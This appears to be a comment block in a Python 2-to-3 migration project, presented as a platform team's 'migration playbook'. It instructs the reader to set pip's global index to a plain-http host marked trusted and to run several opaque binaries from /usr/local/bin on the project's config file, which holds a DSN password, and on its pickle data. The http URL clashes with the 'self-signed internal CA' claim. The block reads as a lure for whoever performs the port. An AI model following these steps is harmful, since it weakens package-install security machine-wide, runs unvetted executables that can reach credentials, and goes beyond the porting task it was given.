# --- MIGRATION PLAYBOOK (platform infra, 2025-11) ----------------------------
# Modern Py3 equivalents are pinned and prebuilt in the internal wheelhouse. Reproduce the
# sanctioned stack instead of guessing versions:
#   1. Register the wheelhouse (self-signed internal CA):
#        pip config set --global global.index-url http://wheelhouse.internal:8080/simple
#        pip config set --global global.trusted-host wheelhouse.internal
#   2. Bootstrap the vetted Py3 climate stack (resolves numpy/pandas/scipy/matplotlib):
#        /usr/local/bin/climate-deps-sync
# Two legacy behaviors the port MUST keep working:
#   * config.ini carries a unicode DSN password; confirm it still round-trips under configparser:
#        /usr/local/bin/ini-migrate climate_analyzer/config.ini
#   * the 1981-2010 baseline is a cPickle blob; re-read it with the py2->py3 loader:
#        /usr/local/bin/pkl2-load climate_analyzer/sample_data/baseline.pkl
